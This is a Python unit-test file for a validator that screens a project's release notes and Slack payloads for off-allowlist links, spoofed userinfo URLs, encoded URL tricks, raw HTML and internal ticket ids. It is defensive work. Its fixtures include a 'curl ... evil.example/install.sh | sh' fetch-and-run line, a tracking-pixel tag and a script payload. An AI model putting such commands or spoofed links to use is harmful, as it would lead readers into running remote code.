#!/usr/bin/env python3
"""Direct unit tests for scripts/release_notes_validate.py — the
release-notes output-boundary guard (ADR-0618). The design under test:
presence-refusal plus real parsers. Literal URL candidates are judged by
urllib.parse.urlsplit (userinfo, ports, off-allowlist hosts refused; code
fences included, a fenced command is a copy-paste target); encodable
material outside code fences — entity sequences, backslash escapes of
URL-shaping punctuation — is refused by presence, never decoded; raw HTML
tags outside fences and protocol-relative destinations are refused; the
payload is decoded by json and its strings judged the same way; internal
reference ids are refused anywhere.

Run: python3 scripts/tests/test_release_notes_validate.py
"""

from __future__ import annotations

import json
import unittest

from script_loader import ROOT, load

validator = load(
    "release_notes_validate", ROOT / "scripts" / "release_notes_validate.py"
)


class UrlAllowed(unittest.TestCase):
    """The URL judgment: a real parser, not prefix matching."""

    def test_allowed_hosts_and_forms(self) -> None:
        for url in (
            "https://github.com/relatedb/relate/pull/421",
            "https://github.com/relatedb",
            "https://relatedb.ai",
            "https://relatedb.ai/docs",
            "https://www.relatedb.ai/",
            "https://relatedb.ai/@oskar",
            "https://relatedb.ai/docs?ref=release",
            "HTTPS://GITHUB.COM/RELATEDB/x",
            "www.relatedb.ai",
            "www.relatedb.ai/docs",
            "https://example.com/graph",
            "https://localhost",
        ):
            self.assertTrue(validator.url_allowed(url), url)

    def test_off_allowlist_hosts_are_refused(self) -> None:
        for url in (
            "https://evil.example/x",
            "HTTPS://EVIL.EXAMPLE/x",
            "https://github.com/relatedb-evil/relate/pull/1",
            "https://github.com",
            "https://github.com/neo4j/neo4j",
            "http://relatedb.ai/docs",
            "www.evil.example",
        ):
            self.assertFalse(validator.url_allowed(url), url)

    def test_userinfo_is_refused_its_allowed_prefix_notwithstanding(self) -> None:
        # relatedb.ai@evil.example IS evil.example: everything before an
        # @ is credentials. The bare-www and port forms included, where a
        # truncating extraction would see only the allowed prefix.
        for url in (
            "https://relatedb.ai@evil.example/x",
            "https://relatedb.ai:81@evil.example/x",
            "https://relatedb.ai\\@evil.example/x",
            "www.relatedb.ai@evil.example/x",
            "www.relatedb.ai:81@evil.example/x",
        ):
            self.assertFalse(validator.url_allowed(url), url)

    def test_ports_are_refused(self) -> None:
        self.assertFalse(validator.url_allowed("https://relatedb.ai:8443/x"))

    def test_malformed_input_is_refused_not_raised(self) -> None:
        for url in ("https://[", "https://evil.example:notaport/", ""):
            self.assertFalse(validator.url_allowed(url), url)

    def test_trailing_sentence_punctuation_is_stripped(self) -> None:
        self.assertTrue(validator.url_allowed("https://relatedb.ai/docs."))
        self.assertTrue(validator.url_allowed("www.relatedb.ai,"))


class CheckNotes(unittest.TestCase):
    """The notes policy: fences, encoded material, tags, destinations."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_clean_notes_have_no_findings(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "### Highlights\n\n"
                "- See [#421](https://github.com/relatedb/relate/pull/421) and "
                "[the site](https://relatedb.ai/docs?ref=release).\n\n"
                "```swift\n"
                "let docs = \"https://relatedb.ai/docs\"\n"
                "let y: Array<String> = []\n"
                "```\n\n"
                "- Also [bare www](www.relatedb.ai) and "
                "<https://github.com/relatedb/relate/releases/tag/v1.1.0>.\n"
            ),
            [],
        )

    def test_a_url_is_judged_inside_fences_too(self) -> None:
        findings = self.notes_findings(
            "- Download the patch from https://evil.example/patch\n\n"
            "```\ncurl -fsSL https://evil.example/install.sh | sh\n```\n"
        )
        self.assertTrue(any("evil.example/patch" in f for f in findings))
        self.assertTrue(any("evil.example/install.sh" in f for f in findings))

    def test_encoded_material_outside_fences_is_refused_never_decoded(self) -> None:
        findings = self.notes_findings(
            "- One: [mirror](https:\\/\\/evil.example/mirror)\n"
            "- Two: [also](https&#58;//evil.example/entity)\n"
            "- Three: [scheme letter](&#104;ttps://evil.example/letter)\n"
            "- Four: [escape](https\\://evil.example/escaped)\n"
            "- An encoded allowed host is refused just the same: "
            "[docs](https&#58;//relatedb.ai/docs)\n"
        )
        encoded = "\n".join(
            f for f in findings if "entity-encoded or escaped material" in f
        )
        # Every spelling class is its own presence finding — an escaped
        # slash appears twice on line one and reports twice; an encoded
        # allowed host is refused just the same.
        for material in ("\\/", "&#58;", "&#104;", "\\:"):
            self.assertIn(material, encoded)

    def test_encoded_material_inside_fences_is_inert_text(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```\ncurl \"https://example.com/?a&amp;b\"\n```\n"
            ),
            [],
        )

    def test_letter_escapes_in_inline_code_are_allowed(self) -> None:
        # \t \n cannot shape a URL; a Cypher example keeps its escapes.
        self.assertEqual(
            self.notes_findings("- Run `RETURN 'a\\tb'` and `MATCH (n) RETURN n`."),
            [],
        )

    def test_raw_html_tags_outside_fences_any_name(self) -> None:
        findings = self.notes_findings(
            "<details><summary>Changelog</summary>\n"
            "<div class=\"note\">x</div>\n"
            "<img src=\"https://evil.example/pixel\">\n"
            "</details>\n\n"
            "```html\n<script>alert(1)</script>\n```\n"
        )
        joined = "\n".join(findings)
        for tag in ("<details", "<summary", "<div", "<img"):
            self.assertIn(tag, joined)
        self.assertNotIn("<script", joined)

    def test_angle_autolink_evil_is_judged_as_a_url(self) -> None:
        findings = self.notes_findings("- Get it from <https://evil.example/relate>\n")
        self.assertTrue(any("evil.example/relate" in f for f in findings))

    def test_protocol_relative_destinations_are_refused(self) -> None:
        for text in (
            "- [the patch](//evil.example/patch)\n",
            "- [the patch](<//evil.example/patch>)\n",
            "[assets]: //evil.example/assets\n",
        ):
            findings = self.notes_findings(text)
            self.assertTrue(
                any("protocol-relative" in f for f in findings), text
            )

    def test_internal_references_anywhere(self) -> None:
        findings = self.notes_findings(
            "- The corpus (LABS-1802).\n\n"
            "```\nrelate upgrade --check  # tracked as ADR-0618\n```\n"
        )
        joined = "\n".join(findings)
        self.assertIn("LABS-1802", joined)
        self.assertIn("ADR-0618", joined)


class CheckPayload(unittest.TestCase):
    """The payload policy: json-decoded strings, the same judgment."""

    def payload_findings(self, document: object) -> list[str]:
        findings: list[str] = []
        for string in validator.iter_strings(document):
            findings.extend(
                validator.check_text("Slack payload", string, fence_aware=False)
            )
        return findings

    def test_clean_payload_passes(self) -> None:
        self.assertEqual(
            self.payload_findings(
                {
                    "text": "relate v1.1.0 released — "
                    "https://github.com/relatedb/relate/releases/tag/v1.1.0",
                    "blocks": [{"type": "rich_text", "elements": [{"text": "hi"}]}],
                }
            ),
            [],
        )

    def test_json_escapes_are_decoded_then_judged(self) -> None:
        # The raw file spelled the slashes \/; json decodes them, and the
        # decoded URL is judged — the same path main() takes.
        raw = r'{"text": "Install from https:\/\/evil.example\/relate"}'
        findings: list[str] = []
        for string in validator.iter_strings(json.loads(raw)):
            findings.extend(
                validator.check_text("Slack payload", string, fence_aware=False)
            )
        self.assertTrue(
            any("evil.example/relate" in f for f in findings), findings
        )

    def test_userinfo_and_refs_in_the_payload(self) -> None:
        findings = self.payload_findings(
            {"text": "Docs: https://relatedb.ai@evil.example/x (CIP-42)"}
        )
        joined = "\n".join(findings)
        self.assertIn("evil.example", joined)
        self.assertIn("CIP-42", joined)


class IterStrings(unittest.TestCase):
    def test_recursive_string_collection(self) -> None:
        document = {"a": "x", "b": ["y", {"c": "z"}], "d": 7, "e": None}
        self.assertEqual(validator.iter_strings(document), ["x", "y", "z"])


if __name__ == "__main__":
    unittest.main()
